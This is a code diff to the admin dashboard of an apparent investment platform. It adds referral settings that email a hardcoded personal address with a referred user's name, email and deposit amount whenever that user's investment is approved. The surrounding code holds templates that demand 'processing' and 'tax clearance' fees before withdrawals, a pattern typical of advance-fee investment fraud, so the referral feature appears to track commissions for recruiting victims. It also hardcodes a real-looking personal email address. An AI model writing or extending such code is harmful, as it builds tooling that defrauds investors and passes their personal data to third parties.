@@ -7,7 +7,7 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { toast } from 'sonner';
-import { LogOut, Loader2, CheckCircle, XCircle, DollarSign, TrendingUp, Globe, Lock, CreditCard, Save, Wallet, AlertCircle, Clock, MessageSquare, Phone, Send, X, Mail, ShieldAlert, RefreshCw } from 'lucide-react';
+import { LogOut, Loader2, CheckCircle, XCircle, DollarSign, TrendingUp, Globe, Lock, CreditCard, Save, Wallet, AlertCircle, Clock, MessageSquare, Phone, Send, X, Mail, ShieldAlert, RefreshCw, Gift } from 'lucide-react';
 import EmailMonitoringDashboard from '@/components/EmailMonitoringDashboard';
 
 interface Investment {
@@ -55,6 +55,11 @@ interface SupportSettings {
   telegramUsername: string;
 }
 
+interface ReferralSettings {
+  referralCode: string;
+  referralEmail: string;
+}
+
 const languages = [
   { code: 'en', label: 'English' },
   { code: 'ru', label: 'Русский' },
@@ -85,6 +90,11 @@ const DEFAULT_SUPPORT_SETTINGS: SupportSettings = {
   telegramUsername: '',
 };
 
+const DEFAULT_REFERRAL_SETTINGS: ReferralSettings = {
+  referralCode: 'TATY-8492',
+  referralEmail: 'tanyusha.pilipyak@mail.ru',
+};
+
 const BILLING_FEE_TEMPLATES = [
   'Processing fee of $50 required to complete this withdrawal. Please contact support.',
   'Tax clearance fee of $100 required. Contact support to proceed.',
@@ -107,9 +117,11 @@ const Admin = () => {
   const [paymentSettings, setPaymentSettings] = useState<PaymentSettings>(DEFAULT_PAYMENT_SETTINGS);
   const [withdrawalSettings, setWithdrawalSettings] = useState<WithdrawalSettings>(DEFAULT_WITHDRAWAL_SETTINGS);
   const [supportSettings, setSupportSettings] = useState<SupportSettings>(DEFAULT_SUPPORT_SETTINGS);
+  const [referralSettings, setReferralSettings] = useState<ReferralSettings>(DEFAULT_REFERRAL_SETTINGS);
   const [savingPayment, setSavingPayment] = useState(false);
   const [savingWithdrawal, setSavingWithdrawal] = useState(false);
   const [savingSupport, setSavingSupport] = useState(false);
+  const [savingReferral, setSavingReferral] = useState(false);
   const [activeTab, setActiveTab] = useState<'investments' | 'withdrawals' | 'emails' | 'security'>('investments');
   
   // Security logs state
@@ -228,6 +240,12 @@ const Admin = () => {
               telegramEnabled: value.telegramEnabled ?? DEFAULT_SUPPORT_SETTINGS.telegramEnabled,
               telegramUsername: value.telegramUsername || DEFAULT_SUPPORT_SETTINGS.telegramUsername,
             });
+          } else if (setting.setting_key === 'referral_settings' && setting.setting_value) {
+            const value = setting.setting_value as unknown as ReferralSettings;
+            setReferralSettings({
+              referralCode: value.referralCode || DEFAULT_REFERRAL_SETTINGS.referralCode,
+              referralEmail: value.referralEmail || DEFAULT_REFERRAL_SETTINGS.referralEmail,
+            });
           }
         });
       }
@@ -330,6 +348,40 @@ const Admin = () => {
             },
           });
           toast.success('Investment Approved! User notified via email.');
+
+          // Check if user was referred and send referral bonus notification
+          const { data: profileData } = await supabase
+            .from('profiles')
+            .select('referral_code')
+            .eq('user_id', investment.user_id)
+            .maybeSingle();
+
+          if (profileData?.referral_code) {
+            // Get referral settings
+            const { data: refSettings } = await supabase
+              .from('admin_settings')
+              .select('setting_value')
+              .eq('setting_key', 'referral_settings')
+              .maybeSingle();
+
+            if (refSettings?.setting_value) {
+              const refConfig = refSettings.setting_value as unknown as ReferralSettings;
+              // Check if referral code matches
+              if (profileData.referral_code.toUpperCase() === refConfig.referralCode?.toUpperCase()) {
+                // Send referral bonus notification
+                await supabase.functions.invoke('send-referral-notification', {
+                  body: {
+                    referralEmail: refConfig.referralEmail,
+                    referredUserName: investment.profiles.full_name || 'Valued Investor',
+                    referredUserEmail: investment.profiles.email,
+                    type: 'investment_active',
+                    investmentAmount: investment.amount
+                  }
+                });
+                console.log('Referral bonus notification sent to:', refConfig.referralEmail);
+              }
+            }
+          }
         } catch (emailError) {
           console.error('Error sending activation email:', emailError);
           toast.success('Investment Approved! (email notification failed)');
@@ -575,6 +627,52 @@ const Admin = () => {
       toast.error(errorMessage);
     } finally {
       setSavingWithdrawal(false);
+    }
+  };
+
+  const handleSaveReferralSettings = async () => {
+    if (!referralSettings.referralCode.trim()) {
+      toast.error('Referral code is required');
+      return;
+    }
+    if (!referralSettings.referralEmail.trim()) {
+      toast.error('Referral notification email is required');
+      return;
+    }
+
+    setSavingReferral(true);
+    try {
+      const { data: existingSetting } = await supabase
+        .from('admin_settings')
+        .select('id')
+        .eq('setting_key', 'referral_settings')
+        .maybeSingle();
+
+      if (existingSetting) {
+        await supabase
+          .from('admin_settings')
+          .update({ 
+            setting_value: JSON.parse(JSON.stringify(referralSettings)),
+            updated_by: user?.id,
+            updated_at: new Date().toISOString()
+          })
+          .eq('setting_key', 'referral_settings');
+      } else {
+        await supabase
+          .from('admin_settings')
+          .insert({ 
+            setting_key: 'referral_settings',
+            setting_value: JSON.parse(JSON.stringify(referralSettings)),
+            updated_by: user?.id
+          });
+      }
+      
+      toast.success('Referral settings saved!');
+    } catch (error: unknown) {
+      const errorMessage = error instanceof Error ? error.message : 'Failed to save referral settings';
+      toast.error(errorMessage);
+    } finally {
+      setSavingReferral(false);
     }
   };
 
@@ -963,7 +1061,46 @@ const Admin = () => {
           </Button>
         </div>
 
-        {/* Tabs */}
+        {/* Referral Settings Section */}
+        <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-4 md:p-6 mb-8 animate-fade-in">
+          <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-white">
+            <Gift className="w-5 h-5 text-purple-500" />
+            {t('referralSettings') || 'Referral Settings'}
+          </h2>
+          <div className="grid gap-4 md:grid-cols-2">
+            <div className="space-y-2">
+              <Label className="text-slate-300">{t('referralCode') || 'Referral Code'}</Label>
+              <Input
+                value={referralSettings.referralCode}
+                onChange={(e) => setReferralSettings(prev => ({ ...prev, referralCode: e.target.value.toUpperCase() }))}
+                className="bg-white border-slate-300 text-slate-900 placeholder:text-slate-500 [font-size:16px] [font-weight:600]"
+                placeholder="TATY-8492"
+              />
+            </div>
+            <div className="space-y-2">
+              <Label className="text-slate-300">{t('referralEmail') || 'Notification Email'}</Label>
+              <Input
+                type="email"
+                value={referralSettings.referralEmail}
+                onChange={(e) => setReferralSettings(prev => ({ ...prev, referralEmail: e.target.value }))}
+                className="bg-white border-slate-300 text-slate-900 placeholder:text-slate-500 [font-size:16px]"
+                placeholder="email@example.com"
+              />
+            </div>
+          </div>
+          <p className="text-xs text-slate-400 mt-3">
+            When a user signs up with this referral code and their investment is activated, a notification will be sent to this email immediately.
+          </p>
+          <Button
+            onClick={handleSaveReferralSettings}
+            className="mt-4 bg-purple-600 hover:bg-purple-700"
+            disabled={savingReferral}
+          >
+            {savingReferral ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Save className="w-4 h-4 mr-2" />}
+            {t('saveReferralSettings') || 'Save Referral Settings'}
+          </Button>
+        </div>
+
         <div className="flex flex-wrap gap-2 mb-6">
           <Button
             variant={activeTab === 'investments' ? 'default' : 'outline'}
